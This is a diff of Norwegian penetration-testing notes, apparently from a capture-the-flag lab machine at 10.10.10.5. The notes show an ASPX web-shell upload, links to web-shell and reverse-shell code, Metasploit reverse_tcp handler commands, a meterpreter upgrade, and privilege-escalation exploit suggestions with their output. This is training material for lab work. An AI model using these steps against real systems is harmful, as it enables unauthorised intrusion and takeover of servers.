@@ -18,34 +18,21 @@ windows maskin
 
 `80/tcp open  http`
 
-logget inn ftp med anonymous. masse filer. last ned alt med `mget * .` og login med -i som fjerner prompts
+logget inn **ftp **med **anonymous**.   login med -i som fjerner prompts
 
 http kjører iis7
 
-laster opp et aspx shell [https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx)
 
-[http://10.10.10.5](http://10.10.10.5/myshell.aspx)/sh.aspx
+fikk et skikkelig shell med [https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/](https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/)
 
-kan her kjøre kommandoer. /c net user
 
-User accounts for \
+**windows 7 6.1 build 7600 x86**
 
-Administrator            babis                    Guest
+**koble et shell rett inn i metasploit og oppgradere til meterpreter**
 
-The command completed with one or more errors.
 
-/c whoami
 
-iis apppool\web
-
-fikk shell med [https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/](https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/)
-
-prøve å escalata nå da
-
-windows 7 6.1 build 7600
-
-oppgradere fra nc til metasploit til meterpreter
-
+```
 * use mutli/handler
 
 * set LHOST attack-machine
@@ -55,13 +42,36 @@ oppgradere fra nc til metasploit til meterpreter
 * set payload windows/shell/reverse\_tcp
 
 * exploit'
+```
+
 
 background session med ctrl z&lt;
 
 `use post/multi/manage/shell_to_meterpreter`
 
+
+kan her kjøre kommandoer. 
+
+
 ```
-use post/multi/recon/local_exploit_suggester 
+net users
+```
+
+
+```
+Administrator            babis                    Guest**
+``
+
+/c whoami = iis apppool\**web**
+
+
+
+**```
+use post/multi/recon/local_exploit_suggester **
+**FORSØKT ALLE DISSE UTEN HELL**
+
+
+
 ```
 
 \[+\] 10.10.10.5 - exploit/windows/local/bypassuac\_eventvwr: The target appears to be vulnerable.
@@ -85,4 +95,18 @@ use post/multi/recon/local_exploit_suggester
 \[+\] 10.10.10.5 - exploit/windows/local/ms16\_032\_secondary\_logon\_handle\_privesc: The target service is running, but could not be validated.
 
 \[+\] 10.10.10.5 - exploit/windows/local/ppr\_flatten\_rec: The target appears to be vulnerable.
+```
+
+getsystem = ingenting
+
+```
+
+wmic qfe get
+```
+
+no work :(
+
+sjekke hvilke 
+
+
 
